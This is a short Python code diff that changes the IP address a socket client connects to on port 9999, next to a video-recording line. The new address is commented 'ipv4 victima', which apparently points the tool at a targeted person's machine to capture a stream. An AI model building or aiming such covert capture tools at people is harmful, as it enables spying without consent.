@@ -9,7 +9,7 @@ out = cv2.VideoWriter("Grabacion1.mp4", codec , 15.0,(1366, 768))"""
 
 
 client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-host_ip = '192.168.1.11'#papa pc ip
+host_ip = '192.168.27.1'#ipv4 victima
 port =  9999
 client_socket.connect((host_ip,port))
 data = b""
